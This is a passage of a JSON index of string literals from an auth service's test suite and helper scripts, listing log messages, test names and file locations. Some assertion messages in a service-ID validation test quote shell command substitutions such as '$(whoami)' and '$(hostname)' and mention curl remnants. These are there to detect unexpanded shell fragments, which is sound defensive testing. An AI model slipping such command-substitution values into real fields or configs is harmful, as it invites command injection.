      ]
    },
    "SHA1": {
      "value": "SHA1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:97"
      ]
    },
    "SHUTDOWN_TIMEOUT_SECONDS": {
      "value": "SHUTDOWN_TIMEOUT_SECONDS",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:49",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:69",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:99",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:174",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:228",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:244",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:271",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:305",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:358",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:366"
      ]
    },
    "SHUTDOWN_TIMEOUT_SECONDS=": {
      "value": "SHUTDOWN_TIMEOUT_SECONDS=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:83"
      ]
    },
    "SIGTERM handler exceeded timeout in staging:": {
      "value": "SIGTERM handler exceeded timeout in staging:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:334"
      ]
    },
    "SIGTERM handler timeout:": {
      "value": "SIGTERM handler timeout:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:318"
      ]
    },
    "SIGTERM handling completed in": {
      "value": "SIGTERM handling completed in",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:314"
      ]
    },
    "SIMULATING": {
      "value": "SIMULATING",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:338"
      ]
    },
    "SLA compliance and incident prevention for": {
      "value": "SLA compliance and incident prevention for",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:497"
      ]
    },
    "SOME TESTS FAILED": {
      "value": "SOME TESTS FAILED",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:401",
        "scripts/test_database_url_builder_comprehensive.py:352",
        "scripts/test_ssl_certificates_staging.py:309",
        "scripts/test_staging_migrations.py:329"
      ]
    },
    "SPEC": {
      "value": "SPEC",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:24",
        "scripts/business_value_test_index.py:115"
      ]
    },
    "SQL_ECHO": {
      "value": "SQL_ECHO",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:19"
      ]
    },
    "SSL Certificate Validation": {
      "value": "SSL Certificate Validation",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:263"
      ]
    },
    "SSL Parameter Handling": {
      "value": "SSL Parameter Handling",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:308",
        "scripts/test_ssl_certificates_staging.py:264"
      ]
    },
    "SSL TEST SUMMARY": {
      "value": "SSL TEST SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:287"
      ]
    },
    "SSL certificate expiry not handled gracefully:": {
      "value": "SSL certificate expiry not handled gracefully:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:378"
      ]
    },
    "SSL configuration issues:": {
      "value": "SSL configuration issues:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:181"
      ]
    },
    "SSL configured:": {
      "value": "SSL configured:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:82"
      ]
    },
    "SSL connection FAILED:": {
      "value": "SSL connection FAILED:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:88"
      ]
    },
    "SSL connection failure replicated:": {
      "value": "SSL connection failure replicated:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:276"
      ]
    },
    "SSL connection: SUCCESS": {
      "value": "SSL connection: SUCCESS",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:73"
      ]
    },
    "SSL parameter conversion issues:": {
      "value": "SSL parameter conversion issues:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:120"
      ]
    },
    "SSL parameter missing for regular connection": {
      "value": "SSL parameter missing for regular connection",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:179"
      ]
    },
    "SSL parameters in Cloud SQL URL": {
      "value": "SSL parameters in Cloud SQL URL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:268"
      ]
    },
    "SSL parameters present as expected": {
      "value": "SSL parameters present as expected",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:154"
      ]
    },
    "SSL parameters present in Cloud SQL URL": {
      "value": "SSL parameters present in Cloud SQL URL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:176"
      ]
    },
    "SSL parameters should be removed": {
      "value": "SSL parameters should be removed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:219"
      ]
    },
    "SSL parameters should be removed for Cloud SQL": {
      "value": "SSL parameters should be removed for Cloud SQL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:56",
        "auth_service/tests/test_staging_auth_ssl_failures.py:57",
        "auth_service/tests/test_staging_auth_ssl_failures.py:286",
        "auth_service/tests/test_staging_auth_ssl_failures.py:287"
      ]
    },
    "SSL parameters still present in Cloud SQL URL:": {
      "value": "SSL parameters still present in Cloud SQL URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:88"
      ]
    },
    "SSL validation: Not applicable (Unix socket handles encryption)": {
      "value": "SSL validation: Not applicable (Unix socket handles encryption)",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:45"
      ]
    },
    "SSL/authentication method mismatch": {
      "value": "SSL/authentication method mismatch",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:203"
      ]
    },
    "STAGING": {
      "value": "STAGING",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:113"
      ]
    },
    "STAGING DEPLOYMENT VALIDATION TEST SUITE": {
      "value": "STAGING DEPLOYMENT VALIDATION TEST SUITE",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:186"
      ]
    },
    "STAGING ENVIRONMENT TEST RUNNER": {
      "value": "STAGING ENVIRONMENT TEST RUNNER",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:41"
      ]
    },
    "STAGING ENVIRONMENT TEST SUITE": {
      "value": "STAGING ENVIRONMENT TEST SUITE",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:162"
      ]
    },
    "STAGING ERROR MONITOR LOGIC VALIDATION": {
      "value": "STAGING ERROR MONITOR LOGIC VALIDATION",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:231"
      ]
    },
    "STAGING STARTUP SEQUENCE TESTS": {
      "value": "STAGING STARTUP SEQUENCE TESTS",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:226"
      ]
    },
    "STAGING_API_URL": {
      "value": "STAGING_API_URL",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:24",
        "scripts/test_staging.py:45"
      ]
    },
    "STAGING_AUTH_URL": {
      "value": "STAGING_AUTH_URL",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:25",
        "scripts/test_staging.py:46"
      ]
    },
    "STAGING_DATABASE_URL": {
      "value": "STAGING_DATABASE_URL",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:143"
      ]
    },
    "STAGING_FRONTEND_URL": {
      "value": "STAGING_FRONTEND_URL",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:26",
        "scripts/test_staging.py:47"
      ]
    },
    "STAGING_REDIS_URL": {
      "value": "STAGING_REDIS_URL",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:144"
      ]
    },
    "STAGING_URL": {
      "value": "STAGING_URL",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:23",
        "scripts/test_staging.py:44"
      ]
    },
    "STDERR:": {
      "value": "STDERR:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:89",
        "scripts/test_staging_migrations.py:159"
      ]
    },
    "STDOUT:": {
      "value": "STDOUT:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:88",
        "scripts/test_staging_migrations.py:158"
      ]
    },
    "SUCCESS! PostgreSQL version:": {
      "value": "SUCCESS! PostgreSQL version:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:92",
        "scripts/test_staging_db_direct.py:110"
      ]
    },
    "SUCCESS: Alembic can connect to staging database": {
      "value": "SUCCESS: Alembic can connect to staging database",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:154"
      ]
    },
    "SUCCESS: AuthConfig URL connection successful!": {
      "value": "SUCCESS: AuthConfig URL connection successful!",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:207"
      ]
    },
    "SUCCESS: AuthConfig generated correct Cloud SQL URL": {
      "value": "SUCCESS: AuthConfig generated correct Cloud SQL URL",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:142"
      ]
    },
    "SUCCESS: Configuration validation passed": {
      "value": "SUCCESS: Configuration validation passed",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:142",
        "auth_service/test_url_construction.py:78"
      ]
    },
    "SUCCESS: Connection testing completed successfully": {
      "value": "SUCCESS: Connection testing completed successfully",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:319"
      ]
    },
    "SUCCESS: Credential validation passed": {
      "value": "SUCCESS: Credential validation passed",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:260"
      ]
    },
    "SUCCESS: Direct asyncpg connection successful!": {
      "value": "SUCCESS: Direct asyncpg connection successful!",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:69"
      ]
    },
    "SUCCESS: No test stubs found in production code.": {
      "value": "SUCCESS: No test stubs found in production code.",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:40"
      ]
    },
    "SUCCESS: No tests found in excluded directories (site-packages, venv, etc.)": {
      "value": "SUCCESS: No tests found in excluded directories (site-packages, venv, etc.)",
      "category": "test_literals",
      "locations": [
        "scripts/test_exclusion_check.py:42"
      ]
    },
    "SUCCESS: No violations found! All conftest.py files are at service-level.": {
      "value": "SUCCESS: No violations found! All conftest.py files are at service-level.",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:100"
      ]
    },
    "SUCCESS: Renamed to": {
      "value": "SUCCESS: Renamed to",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:191"
      ]
    },
    "SUCCESS: Socket path exists:": {
      "value": "SUCCESS: Socket path exists:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:243"
      ]
    },
    "SUCCESS: TCP connection successful! Version:": {
      "value": "SUCCESS: TCP connection successful! Version:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:104"
      ]
    },
    "SUCCESS: URL construction is working correctly": {
      "value": "SUCCESS: URL construction is working correctly",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:240"
      ]
    },
    "SUCCESS: URL contains all expected components": {
      "value": "SUCCESS: URL contains all expected components",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:77"
      ]
    },
    "SUCCESS: URLs have expected Cloud SQL format": {
      "value": "SUCCESS: URLs have expected Cloud SQL format",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:113"
      ]
    },
    "SUGGESTION: Function": {
      "value": "SUGGESTION: Function",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:619"
      ]
    },
    "SUGGESTION: Refactor": {
      "value": "SUGGESTION: Refactor",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:622"
      ]
    },
    "SUMMARY": {
      "value": "SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:389"
      ]
    },
    "SUMMARY:": {
      "value": "SUMMARY:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:64",
        "scripts/test_environment_detection.py:169"
      ]
    },
    "Safe Name": {
      "value": "Safe Name",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:251",
        "auth_service/tests/test_security.py:281",
        "auth_service/tests/test_security.py:353"
      ]
    },
    "Safety check prevented file splitting:": {
      "value": "Safety check prevented file splitting:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:840"
      ]
    },
    "Save detailed JSON report to file": {
      "value": "Save detailed JSON report to file",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:54"
      ]
    },
    "Scale horizontally to reduce CPU load": {
      "value": "Scale horizontally to reduce CPU load",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:387"
      ]
    },
    "Scan Date:": {
      "value": "Scan Date:",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:309"
      ]
    },
    "Scan all test directories in codebase": {
      "value": "Scan all test directories in codebase",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:375"
      ]
    },
    "Scan complete:": {
      "value": "Scan complete:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:91"
      ]
    },
    "Scan completed. Found": {
      "value": "Scan completed. Found",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:371"
      ]
    },
    "Scan for test stubs": {
      "value": "Scan for test stubs",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:355"
      ]
    },
    "Scan specific directory": {
      "value": "Scan specific directory",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:377"
      ]
    },
    "Scan specific file": {
      "value": "Scan specific file",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:379"
      ]
    },
    "Scanned": {
      "value": "Scanned",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:718"
      ]
    },
    "Scanning": {
      "value": "Scanning",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:67",
        "scripts/remove_test_stubs.py:245",
        "scripts/test_failure_scanner.py:79"
      ]
    },
    "Scanning directory:": {
      "value": "Scanning directory:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:103"
      ]
    },
    "Scanning file:": {
      "value": "Scanning file:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:130"
      ]
    },
    "Scanning for test failures...": {
      "value": "Scanning for test failures...",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:53"
      ]
    },
    "Scanning for test size violations...": {
      "value": "Scanning for test size violations...",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:70"
      ]
    },
    "Scanning for test stubs...": {
      "value": "Scanning for test stubs...",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:368"
      ]
    },
    "Scanning for test violations...": {
      "value": "Scanning for test violations...",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:699"
      ]
    },
    "Scanning test files in:": {
      "value": "Scanning test files in:",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:209"
      ]
    },
    "Scanning tests...": {
      "value": "Scanning tests...",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:784"
      ]
    },
    "Scenario '": {
      "value": "Scenario '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:406"
      ]
    },
    "Schedule tech debt sprint to address": {
      "value": "Schedule tech debt sprint to address",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:257"
      ]
    },
    "Script to add pytest markers to test files based on their dependencies": {
      "value": "Script to add pytest markers to test files based on their dependencies",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:2"
      ]
    },
    "Script to fix common syntax errors in test files": {
      "value": "Script to fix common syntax errors in test files",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_errors.py:2"
      ]
    },
    "Script to standardize L3 test file naming convention\nRenames test_*_l3.py files to test_*.py and updates references": {
      "value": "Script to standardize L3 test file naming convention\nRenames test_*_l3.py files to test_*.py and updates references",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:2"
      ]
    },
    "Scripts": {
      "value": "Scripts",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:134",
        "scripts/generate_test_audit.py:27",
        "scripts/test_exclusion_check.py:22"
      ]
    },
    "Searched locations:": {
      "value": "Searched locations:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:120"
      ]
    },
    "Second allocation failed:": {
      "value": "Second allocation failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:168"
      ]
    },
    "Second state should be stored successfully": {
      "value": "Second state should be stored successfully",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:170"
      ]
    },
    "Second use should be blocked": {
      "value": "Second use should be blocked",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:133"
      ]
    },
    "Second use should be blocked (reuse attack prevention)": {
      "value": "Second use should be blocked (reuse attack prevention)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:72"
      ]
    },
    "Second use should be blocked for": {
      "value": "Second use should be blocked for",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:331"
      ]
    },
    "Secret Access": {
      "value": "Secret Access",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:236"
      ]
    },
    "Secret Manager": {
      "value": "Secret Manager",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:112",
        "scripts/test_staging_config.py:127",
        "scripts/test_staging_config.py:136"
      ]
    },
    "Secret access test failed:": {
      "value": "Secret access test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:171"
      ]
    },
    "Secret loader": {
      "value": "Secret loader",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:411"
      ]
    },
    "Secrets failed to load": {
      "value": "Secrets failed to load",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:66"
      ]
    },
    "Security Tests for Auth Service - Critical Security Validation\nTests SQL injection, XSS, CSRF protection, and audit logging": {
      "value": "Security Tests for Auth Service - Critical Security Validation\nTests SQL injection, XSS, CSRF protection, and audit logging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:1"
      ]
    },
    "Security validation tests": {
      "value": "Security validation tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:105"
      ]
    },
    "SecurityTest123!": {
      "value": "SecurityTest123!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:134"
      ]
    },
    "See": {
      "value": "See",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:392"
      ]
    },
    "Sending ping:": {
      "value": "Sending ping:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_simple.py:27"
      ]
    },
    "Service '": {
      "value": "Service '",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:429"
      ]
    },
    "Service Coordination Fix Validation": {
      "value": "Service Coordination Fix Validation",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:405"
      ]
    },
    "Service ID contains curl command remnants:": {
      "value": "Service ID contains curl command remnants:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:273"
      ]
    },
    "Service ID contains invalid character '": {
      "value": "Service ID contains invalid character '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:177"
      ]
    },
    "Service ID contains literal shell command '$(hostname)':": {
      "value": "Service ID contains literal shell command '$(hostname)':",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:80"
      ]
    },
    "Service ID contains literal shell command '$(whoami)' instead of executed value:": {
      "value": "Service ID contains literal shell command '$(whoami)' instead of executed value:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:53"
      ]
    },
    "Service ID contains shell artifact '": {
      "value": "Service ID contains shell artifact '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:321"
      ]
    },
    "Service ID contains shell metacharacter '": {
      "value": "Service ID contains shell metacharacter '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:119"
      ]
    },
    "Service ID contains unexpanded variable ${INSTANCE_ID}:": {
      "value": "Service ID contains unexpanded variable ${INSTANCE_ID}:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:210"
      ]
    },
    "Service ID contains unexpanded variable ${REGION}:": {
      "value": "Service ID contains unexpanded variable ${REGION}:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:213"
      ]
    },
    "Service ID contains unprocessed environment variables:": {
      "value": "Service ID contains unprocessed environment variables:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:153"
      ]
    },
    "Service ID contains unprocessed nested variables:": {
      "value": "Service ID contains unprocessed nested variables:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:244"
      ]
    },
    "Service ID contains unprocessed shell command: '": {
      "value": "Service ID contains unprocessed shell command: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:113"
      ]
    },
    "Service ID contains unprocessed shell pattern '": {
      "value": "Service ID contains unprocessed shell pattern '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:59"
      ]
    },
    "Service ID hostname shell command error replicated: '": {
      "value": "Service ID hostname shell command error replicated: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:82"
      ]
    },
    "Service ID is literal long shell command:": {
      "value": "Service ID is literal long shell command:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:352"
      ]
    },
    "Service ID is literal shell command:": {
      "value": "Service ID is literal shell command:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:182"
      ]
    },
    "Service ID is unexpanded template:": {
      "value": "Service ID is unexpanded template:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:217"
      ]
    },
    "Service ID literal shell command error replicated: '": {
      "value": "Service ID literal shell command error replicated: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:62"
      ]
    },
    "Service ID shows literal Cloud Run metadata command:": {
      "value": "Service ID shows literal Cloud Run metadata command:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:269"
      ]
    },
    "Service ID shows literal nested command:": {
      "value": "Service ID shows literal nested command:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:240"
      ]
    },
    "Service ID shows literal shell command in container:": {
      "value": "Service ID shows literal shell command in container:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:149"
      ]
    },
    "Service ID too long from shell expansion:": {
      "value": "Service ID too long from shell expansion:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:347"
      ]
    },
    "Service ID validation failed for malformed ID: '": {
      "value": "Service ID validation failed for malformed ID: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:315"
      ]
    },
    "Service Initialization Order": {
      "value": "Service Initialization Order",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:237"
      ]
    },
    "Service discovery failed with retry logic": {
      "value": "Service discovery failed with retry logic",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:219"
      ]
    },
    "Service discovery timing fixes working correctly": {
      "value": "Service discovery timing fixes working correctly",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:222"
      ]
    },
    "Service discovery timing test failed:": {
      "value": "Service discovery timing test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:226"
      ]
    },
    "Service should be ready after marking": {
      "value": "Service should be ready after marking",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:147"
      ]
    },
    "Service should not be ready initially": {
      "value": "Service should not be ready initially",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:132"
      ]
    },
    "Service should not be ready while initializing": {
      "value": "Service should not be ready while initializing",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:136"
      ]
    },
    "Service should not be ready while starting": {
      "value": "Service should not be ready while starting",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:140"
      ]
    },
    "Service shutdown timeout in Cloud Run environment:": {
      "value": "Service shutdown timeout in Cloud Run environment:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:161"
      ]
    },
    "Service status is not healthy:": {
      "value": "Service status is not healthy:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:129"
      ]
    },
    "Service temporarily unavailable": {
      "value": "Service temporarily unavailable",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:124"
      ]
    },
    "Service token duration:": {
      "value": "Service token duration:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:278"
      ]
    },
    "Services are ready for testing!": {
      "value": "Services are ready for testing!",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:206"
      ]
    },
    "Services got same port - conflict not prevented": {
      "value": "Services got same port - conflict not prevented",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:171"
      ]
    },
    "Session": {
      "value": "Session",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:53",
        "auth_service/tests/base/test_mixins.py:58",
        "auth_service/tests/base/test_mixins.py:63",
        "auth_service/tests/utils/assertion_helpers.py:196"
      ]
    },
    "Session Cleanup Job Tests\nTests automated session cleanup and maintenance operations\nFocuses on database cleanup and expired session management": {
      "value": "Session Cleanup Job Tests\nTests automated session cleanup and maintenance operations\nFocuses on database cleanup and expired session management",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:1"
      ]
    },
    "Session Management Tests for Auth Service\nTests complete session lifecycle with database operations\nCovers security, multi-device, and cleanup scenarios": {
      "value": "Session Management Tests for Auth Service\nTests complete session lifecycle with database operations\nCovers security, multi-device, and cleanup scenarios",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:1"
      ]
    },
    "Session Test Data Factory\nCreates test sessions with proper expiration and metadata.\nSupports both active and expired sessions for comprehensive testing.": {
      "value": "Session Test Data Factory\nCreates test sessions with proper expiration and metadata.\nSupports both active and expired sessions for comprehensive testing.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/session_factory.py:1"
      ]
    },
    "Session expiration must be after creation time": {
      "value": "Session expiration must be after creation time",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:132"
      ]
    },
    "Session management imports failed:": {
      "value": "Session management imports failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:161"
      ]
    },
    "Session revoked": {
      "value": "Session revoked",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:208"
      ]
    },
    "Session.": {
      "value": "Session.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:202"
      ]
    },
    "SessionFactory": {
      "value": "SessionFactory",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/__init__.py:15"
      ]
    },
    "Set up ACTUAL staging credentials from Secret Manager": {
      "value": "Set up ACTUAL staging credentials from Secret Manager",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:47"
      ]
    },
    "Set up minimal staging environment variables": {
      "value": "Set up minimal staging environment variables",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:48"
      ]
    },
    "Set up staging environment variables": {
      "value": "Set up staging environment variables",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:45"
      ]
    },
    "Setup and cleanup for each test": {
      "value": "Setup and cleanup for each test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:33"
      ]
    },
    "Setup async database engine for tests": {
      "value": "Setup async database engine for tests",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:30"
      ]
    },
    "Setup database session for test": {
      "value": "Setup database session for test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:182"
      ]
    },
    "Setup test database with proper configuration": {
      "value": "Setup test database with proper configuration",
